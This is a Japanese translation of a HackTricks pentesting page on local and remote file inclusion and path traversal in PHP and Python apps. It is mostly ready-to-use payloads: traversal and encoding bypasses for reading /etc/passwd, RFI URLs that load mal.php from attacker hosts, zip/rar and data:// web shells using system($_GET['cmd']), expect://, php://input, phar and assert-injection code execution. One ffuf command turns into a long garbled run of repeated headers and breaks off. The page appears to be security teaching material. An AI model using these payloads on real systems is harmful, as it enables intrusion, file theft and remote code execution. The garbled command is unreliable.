# ファイルインクルージョン/パストラバーサル

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **web3のバグについてもっと学ぶために**

🐞 web3のバグチュートリアルを読む

🔔 新しいバグバウンティについて通知を受ける

💬 コミュニティディスカッションに参加する

## ファイルインクルージョン

**リモートファイルインクルージョン（RFI）：** ファイルはリモートサーバーからロードされます（最適：コードを書いてサーバーが実行します）。PHPでは、これはデフォルトで**無効**になっています（**allow\_url\_include**）。\
**ローカルファイルインクルージョン（LFI）：** サーバーがローカルファイルをロードします。

この脆弱性は、ユーザーがサーバーがロードするファイルを何らかの方法で制御できる場合に発生します。

脆弱な**PHP関数**：require、require\_once、include、include\_once

この脆弱性を悪用するための興味深いツール：[https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**複数の\*nix LFIリストを組み合わせ、さらにパスを追加して、次のリストを作成しました:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

`/`を`\`に変更してみてください\
`../../../../../`を追加してみてください

脆弱性の存在を確認するために、/etc/passwordファイルを見つけるために複数の技術を使用するリストは[こちら](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)で見つけることができます。

### **Windows**

複数のリストを統合しました:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

`/`を`\`に変更してみてください\
`C:/`を削除して`../../../../../`を追加してみてください

脆弱性の存在を確認するために、/boot.iniファイルを見つけるために複数の技術を使用するリストは[こちら](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)で見つけることができます。

### **OS X**

LinuxのLFIリストを確認してください。

## 基本的なLFIとバイパス

すべての例はローカルファイルインクルージョンのものですが、リモートファイルインクルージョンにも適用できます（page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/）。
```
http://example.com/index.php?page=../../../etc/passwd
```
### 非再帰的に剥奪されたトラバーサルシーケンス

In some cases, when performing file inclusion attacks, the web application may strip traversal sequences in a non-recursive manner. This means that it only removes the traversal sequences that are directly present in the file path, without considering any nested or repeated sequences.

いくつかの場合、ファイルインクルージョン攻撃を実行する際に、Webアプリケーションは非再帰的にトラバーサルシーケンスを剥奪することがあります。これは、ネストされたまたは繰り返されたシーケンスを考慮せずに、ファイルパスに直接存在するトラバーサルシーケンスのみを削除することを意味します。
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **ヌルバイト（%00）**

提供された文字列の末尾に追加の文字をバイパスする（バイパス方法：$\_GET\['param']."php"）
```
http://example.com/index.php?page=../../../etc/passwd%00
```
これは**PHP 5.4以降で解決済みです**

### **エンコーディング**

ダブルURLエンコード（およびその他）のような非標準のエンコーディングを使用することができます：
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### 既存のフォルダから

おそらくバックエンドはフォルダのパスをチェックしています。
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### サーバー上のフォルダの特定

アプリケーションのコードや許可された文字によっては、ファイルだけでなくフォルダも再帰的に探索することができる場合があります。そのためには、次の手順を実行します。

* 現在のディレクトリの「深さ」を特定するために、`/etc/passwd`（Linuxの場合）を正常に取得します。
```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
* 現在のディレクトリにあるフォルダの名前を推測して、フォルダ名（ここでは `private`）を追加し、次に `/etc/passwd` に戻ります。
```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd
```
* アプリケーションが脆弱である場合、リクエストには2つの異なる結果があります：
* エラー/出力がない場合、この場所には `private` フォルダが存在しません
* `/etc/passwd` からコンテンツを取得した場合、現在のディレクトリに `private` フォルダが存在することが確認されます
* このテクニックを使用して発見したフォルダは、クラシックなLFIメソッドを使用してファイルをファズ化したり、同じテクニックを再帰的に使用してサブディレクトリをファズ化したりすることができます。

このテクニックを使用して、ファイルシステムの任意の場所にディレクトリを見つけることも可能です。たとえば、同じ仮定（ファイルシステムの深さ3の現在のディレクトリ）の下で、`/var/www/` に `private` ディレクトリが存在するかどうかを確認する場合、次のペイロードを使用します：
```
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
次のコマンドのシーケンスは、`sed`（1）を使用してペイロードを生成し、`ffuf`（2）などのURLファジングツールの入力として使用することができます。

```bash
$ sed 's/^/-H "X-Forwarded-For: /" payload.txt | ffuf -w - -u FUZZ -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" -H "Referer: http://example.com" -H "Cookie: PHPSESSID=1234567890" -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-Host: example.com" -H "X-Forwarded-Proto: http" -H "X-Original-URL: /index.php" -H "X-Original-Method: GET" -H "X-Rewrite-URL: /index.php" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-Server: example.com" -H "X-Host: example.com" -H "X-HTTP-Host-Override: example.com" -H "X-Forwarded-By: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1" -H "X-Client-IP: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1" -H "X-Remote-Host: 127.0.0.1" -H "X-Remote-Port: 80" -H "X-Remote-User: admin" -H "X-Remote-Method: GET" -H "X-Remote-Protocol: HTTP/1.1" -H "X-Remote-Referer: http://example.com" -H "X-Remote-Request-URL: http://example.com/index.php" -H "X-Remote-Request-Method: GET" -H "X-Remote-Request-Protocol: HTTP/1.1" -H "X-Remote-Request-Host: example.com" -H "X-Remote-Request-Port: 80" -H "X-Remote-Request-User: admin" -H "X-Remote-Request-Referer: http://example.com" -H "X-Remote-Request-Path: /index.php" -H "X-Remote-Request-Query: param=value" -H "X-Remote-Request-Fragment: fragment" -H "X-Remote-Request-Scheme: http" -H "X-Remote-Request-Auth: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==" -H "X-Remote-Request-Connection: keep-alive" -H "X-Remote-Request-Content-Type: application/x-www-form-urlencoded" -H "X-Remote-Request-Content-Length: 123" -H "X-Remote-Request-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "X-Remote-Request-Accept-Encoding: gzip, deflate, br" -H "X-Remote-Request-Accept-Language: en-US,en;q=0.5" -H "X-Remote-Request-Cache-Control: max-age=0" -H "X-Remote-Request-Upgrade-Insecure-Requests: 1" -H "X-Remote-Request-If-Modified-Since: Thu, 01 Jan 1970 00:00:00 GMT" -H "X-Remote-Request-If-None-Match: W/"2a-160248fca8c"" -H "X-Remote-Request-If-Unmodified-Since: Thu, 01 Jan 1970 00:00:00 GMT" -H "X-Remote-Request-If-Match: W/"2a-160248fca8c"" -H "X-Remote-Request-If-Range: bytes=0-123" -H "X-Remote-Request-If-Range: Thu, 01 Jan 1970 00:00:00 GMT" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c"" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", bytes=0-123" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", Thu, 01 Jan 1970 00:00:00 GMT" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c"" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", bytes=0-123" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", Thu, 01 Jan 1970 00:00:00 GMT" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c"" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", bytes=0-123" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", Thu, 01 Jan 1970 00:00:00 GMT" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c"" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", bytes=0-123" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", Thu, 01 Jan 1970 00:00:00 GMT" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c"" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", bytes=0-123" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", Thu, 01 Jan 1970 00:00:00 GMT" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c"" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", bytes=0-123" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", Thu, 01 Jan 1970 00:00:00 GMT" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c"" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", bytes=0-123" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", Thu, 01 Jan 1970 00:00:00 GMT" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c"" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", bytes=0-123" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", Thu, 01 Jan 1970 00:00:00 GMT" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c"" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", bytes=0-123" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", Thu, 01 Jan 1970 00:00:00 GMT" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c"" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", bytes=0-123" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", Thu, 01 Jan 1970 00:00:00 GMT" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c"" -H "X-Remote-Request-If-Range: W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", W/"2a-160248fca8c", bytes=0-123" -H "X-Remote-
```
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
```
当然、深さ/場所/入力ディレクトリリストに応じてペイロードを適応させてください。

### **パスの切り詰め**

提供された文字列の末尾にさらに文字を追加することを回避します（回避方法：$\_GET\['param']."php"）
```
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
常に、パスを**偽のディレクトリ**(a/)で**始める**ようにしてください。

**この脆弱性はPHP 5.3で修正されました。**

### **フィルターバイパストリック**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
```
## 基本的な RFI

Remote File Inclusion（リモートファイルインクルージョン）は、ウェブアプリケーションの脆弱性の一つであり、攻撃者がリモートサーバー上のファイルをウェブアプリケーションに組み込むことができるようになります。これにより、攻撃者は任意のコードを実行することができます。

RFI 攻撃を実行するためには、以下の手順を実行します。

1. ターゲットのウェブアプリケーションがリモートファイルのインクルードに使用している関数を特定します。一般的な関数には `include()` や `require()` があります。
2. 攻撃者は、リモートサーバー上にある任意のファイルの URL を作成します。
3. 攻撃者は、ウェブアプリケーションのパラメータに作成した URL を渡します。これにより、攻撃者が指定したファイルがウェブアプリケーションに組み込まれます。
4. ウェブアプリケーションがリモートファイルを組み込む際に、攻撃者が指定したファイルのコードが実行されます。

RFI 攻撃を防ぐためには、以下の対策を実施することが重要です。

- ユーザーからの入力を信頼しないようにし、入力値の検証とエスケープ処理を行います。
- ファイルのインクルードには、ホワイトリスト方式を使用します。許可されたファイルのみを組み込むようにします。
- セキュリティパッチやアップデートを定期的に適用し、ウェブアプリケーションを最新の状態に保ちます。

RFI 攻撃は深刻なセキュリティリスクとなり得るため、ウェブアプリケーションの開発者や管理者は適切な対策を講じる必要があります。
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
## Pythonのルート要素

Pythonでは、次のようなコードでルート要素を指定します。
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
ユーザーが**絶対パス**を**`file_name`**に渡す場合、**前のパスは単に削除**されます。
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
以下は、ファイルインクルージョンに対して脆弱性のある可能性があるトップ25のパラメータのリストです（[リンク](https://twitter.com/trbughunters/status/1279768631845494787)から）：

1. file
2. page
3. id
4. path
5. include
6. document
7. doc
8. content
9. folder
10. view
11. layout
12. template
13. style
14. config
15. data
16. action
17. lang
18. locale
19. type
20. category
21. month
22. year
23. day
24. debug
25. log
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## PHPラッパーとプロトコルを使用したLFI / RFI

### php://filter

PHPフィルターを使用すると、データを読み取る前または書き込む前に基本的な**変更操作**を行うことができます。フィルターには5つのカテゴリがあります：

* [文字列フィルター](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: データからタグを削除します（"<"と">"の間のすべての文字）
* このフィルターは、最新バージョンのPHPから消えています
* [変換フィルター](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : 異なるエンコーディングに変換します（`convert.iconv.<input_enc>.<output_enc>`）。サポートされている**すべてのエンコーディングのリスト**を取得するには、コンソールで次のコマンドを実行します：`iconv -l`

{% hint style="warning" %}
`convert.iconv.*`変換フィルターを悪用すると、**任意のテキストを生成**することができます。これは、任意のテキストを書き込むか、任意のテキストを処理するような関数を作成するのに役立ちます。詳細については、[**phpフィルターを介したLFI2RCE**](lfi2rce-via-php-filters.md)を参照してください。
{% endhint %}

* [圧縮フィルター](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: コンテンツを圧縮します（大量の情報を外部に持ち出す場合に便利です）
* `zlib.inflate`: データを解凍します
* [暗号化フィルター](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : 廃止予定
* `mdecrypt.*` : 廃止予定
* その他のフィルター
* phpで実行すると、いくつかの**予期しないフィルター**が見つかる場合があります：`var_dump(stream_get_filters());`
* `consumed`
* `dechunk`: HTTPチャンクエンコーディングを逆転させます
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
```
{% hint style="warning" %}
「php://filter」という部分は大文字小文字を区別しません
{% endhint %}

### php://fd

このラッパーは、プロセスが開いているファイルディスクリプタにアクセスすることを可能にします。開かれたファイルの内容を外部に持ち出すのに役立つかもしれません。
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
以下のように、**php://stdin、php://stdout、およびphp://stderr**を使用して、それぞれ**ファイルディスクリプタ0、1、および2**にアクセスすることもできます（攻撃にどのように役立つかはわかりません）。

### zip:// および rar://

PHPShellが含まれたZipまたはRarファイルをアップロードしてアクセスします。\
rarプロトコルを悪用するためには、**明示的にアクティベートする必要があります**。
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

data://は、データスキームの一種であり、データをURLとして表現するための方法です。このスキームは、データを直接URLに埋め込むことができます。データは、テキスト、画像、音声、ビデオなど、さまざまな形式で表現することができます。

データスキームは、一般的にはWebページ内で使用されることが多く、外部ファイルの読み込みやデータの埋め込みに使用されます。例えば、HTMLのimg要素のsrc属性にdataスキームを使用することで、画像を直接埋め込むことができます。

データスキームは、一部のセキュリティ上の懸念があるため、注意が必要です。悪意のあるユーザーがデータスキームを使用して、クロスサイトスクリプティング（XSS）攻撃やデータの漏洩などの攻撃を行う可能性があります。そのため、データスキームを使用する際には、信頼できるソースからのみデータを受け取るように注意する必要があります。
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
楽しい事実：XSSをトリガーし、Chromeオーディターをバイパスすることができます。以下のコードを使用します：`http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

ただし、このプロトコルはphpの設定で制限されています。**`allow_url_open`** と **`allow_url_include`** を有効にする必要があります。

### expect://

Expectは有効にする必要があります。これを使用してコードを実行できます。
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POSTパラメーターにペイロードを指定してください。
```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```
### phar://

ウェブがファイルをロードするために`include`のような関数を使用している場合、`.phar`ファイルを使用してPHPコードを実行することもできます。

{% code title="create_phar.php" %}
```python
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');

$phar->stopBuffering();
```
{% endcode %}

そして、次の行を実行して`phar`をコンパイルすることができます。
```bash
php --define phar.readonly=0 create_path.php
```
`test.phar`というファイルが生成され、それを使用してLFIを悪用することができます。

LFIが単にファイルを読み取り、その中のPHPコードを実行しない場合、例えば`file_get_contents()`、`fopen()`、`file()`、`file_exists()`、`md5_file()`、`filemtime()`、`filesize()`などの関数を使用している場合、**phar**プロトコルを使用してファイルを**読み取る**際に発生する**逆シリアル化**を悪用することができます。
詳細については、次の投稿を読んでください：

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### その他のプロトコル

[**ここに含める可能性のあるプロトコル**](https://www.php.net/manual/en/wrappers.php)**を**チェックしてください**：

* [php://memoryとphp://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — メモリまたは一時ファイルに書き込む（ファイルインクルージョン攻撃でどのように役立つかはわかりません）
* [file://](https://www.php.net/manual/en/wrappers.file.php) — ローカルファイルシステムへのアクセス
* [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s)のURLへのアクセス
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s)のURLへのアクセス
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — 圧縮ストリーム
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — パターンに一致するパス名を検索（印刷可能なものを返さないため、ここではあまり役に立ちません）
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — セキュアシェル2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — オーディオストリーム（任意のファイルを読み取るのには役に立ちません）

## PHPの'assert'を使用したLFI

".. "などのトラバーサル文字列をフィルタリングしているような難解なLFIに遭遇し、"Hacking attempt"や"Nice try!"などの応答が返される場合、'assert'インジェクションペイロードが機能するかもしれません。

次のようなペイロード：
```
' and die(show_source('/etc/passwd')) or '
```
次のような「file」パラメータを持つPHPコードを正常に悪用します。
```bash
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```
次に、system()関数を使用して脆弱な「assert」ステートメントでRCE（リモートコード実行）を行う方法があります。
```
' and die(system("whoami")) or '
```
ペイロードを送信する前に、必ずURLエンコードしてください。

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについてもっと学びましょう**

🐞 web3のバグチュートリアルを読む

🔔 新しいバグ報奨金について通知を受ける

💬 コミュニティのディスカッションに参加する

## PHP Blind Path Traversal

{% hint style="warning" %}
このテクニックは、**PHP関数**が**ファイルにアクセス**するための**ファイルパス**を**制御**できる場合に関連しますが、ファイルの内容（**`file()`**への単純な呼び出しのように）は表示されません。
{% endhint %}

[**この素晴らしい投稿**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)では、PHPフィルタを介して盲目的なパストラバーサルがどのように悪用され、エラーオラクルを介してファイルの内容を**外部に流出**させることが説明されています。

要約すると、このテクニックは、**「UCS-4LE」エンコーディング**を使用してファイルの内容を非常に**大きく**することで、ファイルを開く**PHP関数がエラーをトリガー**するようにします。

次に、最初の文字を漏洩させるために、フィルタ**`dechunk`**を他のフィルタ（例：**base64**または**rot13**）と組み合わせて使用し、最後にフィルタ**convert.iconv.UCS-4.UCS-4LE**と**convert.iconv.UTF16.UTF-16BE**を使用して他の文字を**先頭に配置して漏洩**させます。

**脆弱性のある可能性のある関数**：`file_get_contents`、`readfile`、`finfo->file`、`getimagesize`、`md5_file`、`sha1_file`、`hash_file`、`file`、`parse_ini_file`、`copy`、`file_put_contents（これにより読み取り専用のターゲットのみが対象になります）`、`stream_get_contents`、`fgets`、`fread`、`fgetc`、`fgetcsv`、`fpassthru`、`fputs`

詳細な技術的な詳細については、上記の投稿を確認してください！

## LFI2RCE

### 基本的なRFI
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
### Apache/Nginxログファイル経由

